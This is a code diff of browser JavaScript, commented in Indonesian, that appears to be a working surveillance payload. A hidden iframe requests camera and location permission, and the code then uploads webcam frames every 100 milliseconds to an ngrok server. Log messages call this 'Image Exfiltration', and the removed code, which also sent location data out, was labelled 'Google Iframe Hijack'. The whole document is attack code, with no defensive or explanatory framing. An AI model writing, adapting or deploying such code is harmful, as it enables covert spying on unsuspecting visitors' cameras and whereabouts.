@@ -39,12 +39,12 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // KONFIGURASI SERVER (NGROK)
   // ============================================
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   // ============================================
-  // FUNGSI: KIRIM GAMBAR KE SERVER
+  // FUNGSI: KIRIM GAMBAR (MULTIPART FORM-DATA)
   // ============================================
   function sendImageToServer() {
     try {
@@ -53,84 +53,104 @@
       var ctx = canvas.getContext('2d');
 
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        // Gambar frame video ke canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var dataURL = canvas.toDataURL('image/jpeg', 0.6);
+        
+        // Konversi canvas ke Blob (File Gambar)
+        canvas.toBlob(function(blob) {
+          if (!blob) return;
 
-        fetch(SERVER_ENDPOINT, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: dataURL }),
-          keepalive: true
-        }).then(function(res) {
-          log("[+] Gambar terkirim ke server: " + res.status);
-        }).catch(function(err) {
-          log("[-] Gagal kirim gambar: " + err.message);
-        });
+          // Buat FormData
+          var formData = new FormData();
+          formData.append('file', blob, 'capture.jpg');
+
+          // Kirim ke Server
+          fetch(SERVER_ENDPOINT, {
+            method: 'POST',
+            body: formData
+          }).then(function(res) {
+            log("[+] Gambar terkirim ke server: " + res.status);
+          }).catch(function(err) {
+            log("[-] Gagal kirim gambar: " + err.message);
+          });
+
+        }, 'image/jpeg', 0.6); // Kualitas 60%
       }
-    } catch(e) {}
-  }
-
-  // ============================================
-  // FUNGSI: KIRIM LOKASI KE SERVER
-  // ============================================
-  function sendLocationToServer(lat, lon) {
-    try {
-      fetch(SERVER_ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ location: { lat: lat, lon: lon } }),
-        keepalive: true
-      }).then(function(res) {
-        log("[+] Lokasi terkirim ke server: " + res.status);
-      }).catch(function(err) {
-        log("[-] Gagal kirim lokasi: " + err.message);
-      });
-    } catch(e) {}
-  }
-
-  // ============================================
-  // TRIGGER: GOOGLE IFRAME & PERMISSION
-  // ============================================
-  function startGoogleIframeHijack() {
-    try {
-      log("[+] Membuat Iframe Google.com...");
-      
-      // 1. Buat iframe yang memuat Google (tidak bisa diakses DOM-nya)
-      var iframe = document.createElement("iframe");
-      iframe.src = "https://www.google.com";
-      iframe.style.display = "none";
-      document.getElementById("launcher-container").appendChild(iframe);
-      
-      log("[+] Iframe Google dimuat. Meminta izin (Top-Level)...");
-
-      // 2. Minta izin Kamera dari Top-Level (bukan dari iframe)
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          log("[+] 🚨 Kamera DIIZINKAN!");
-          var video = document.getElementById('cam-feed');
-          video.srcObject = stream;
-          video.play().catch(function(){});
-          setInterval(sendImageToServer, 100);
-        })
-        .catch(function(err) {
-          log("[-] Kamera ditolak: " + err.name);
-        });
-
-      // 3. Minta izin Lokasi
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          log("[+] 🚨 Lokasi DIIZINKAN: " + pos.coords.latitude + ", " + pos.coords.longitude);
-          sendLocationToServer(pos.coords.latitude, pos.coords.longitude);
-        },
-        function(err) {
-          log("[-] Lokasi ditolak: " + err.message);
-        }
-      );
-
     } catch(e) {
       log("[-] Error: " + e.message);
     }
   }
+
+  // ============================================
+  // PERMISSION INHERITANCE (ABOUT:BLANK)
+  // ============================================
+  function startPermissionInheritance() {
+    try {
+      log("[+] Membuat Iframe about:blank...");
+      
+      var iframe = document.createElement("iframe");
+      iframe.allow = "camera; microphone; geolocation";
+      iframe.style.display = "none";
+      iframe.src = "about:blank";
+      
+      document.getElementById("launcher-container").appendChild(iframe);
+
+      iframe.onload = function() {
+        try {
+          var doc = iframe.contentDocument || iframe.contentWindow.document;
+          doc.open();
+          doc.write(`
+            <!DOCTYPE html>
+            <html>
+            <body>
+              <script>
+                navigator.mediaDevices.getUserMedia({ video: true })
+                  .then(function(stream) {
+                    parent.postMessage({ type: 'CAM_GRANTED' }, '*');
+                  })
+                  .catch(function(err) {
+                    parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
+                  });
+
+                navigator.geolocation.getCurrentPosition(
+                  function(pos) {
+                    parent.postMessage({ type: 'LOC_GRANTED', lat: pos.coords.latitude, lon: pos.coords.longitude }, '*');
+                  },
+                  function(err) {
+                    parent.postMessage({ type: 'LOC_DENIED', error: err.message }, '*');
+                  }
+                );
+              <\/script>
+            </body>
+            </html>
+          `);
+          doc.close();
+          log("[+] Script disuntikkan ke about:blank.");
+        } catch(e) {
+          log("[-] Gagal menulis ke about:blank: " + e.message);
+        }
+      };
+    } catch(e) {
+      log("[-] Iframe Error: " + e.message);
+    }
+  }
+
+  // ============================================
+  // LISTENER PESAN DARI IFRAME
+  // ============================================
+  window.addEventListener('message', function(e) {
+    if (e.data.type === 'CAM_GRANTED') {
+      log("[+] 🚨 Kamera DIIZINKAN! Mulai streaming gambar...");
+      setInterval(sendImageToServer, 100); // Kirim gambar setiap 100ms
+    } else if (e.data.type === 'CAM_DENIED') {
+      log("[-] Kamera ditolak: " + e.data.error);
+    } else if (e.data.type === 'LOC_GRANTED') {
+      log("[+] 🚨 Lokasi DIIZINKAN: " + e.data.lat + ", " + e.data.lon);
+      // Jika hanya fokus gambar, lokasi bisa diabaikan
+    } else if (e.data.type === 'LOC_DENIED') {
+      log("[-] Lokasi ditolak: " + e.data.error);
+    }
+  });
 
   // ============================================
   // TRIGGER (KLIK)
@@ -145,9 +165,9 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Google Iframe Hijack...");
+    log("[!] Memulai Image Exfiltration...");
 
-    startGoogleIframeHijack();
+    startPermissionInheritance();
 
   }, { once: true });
 
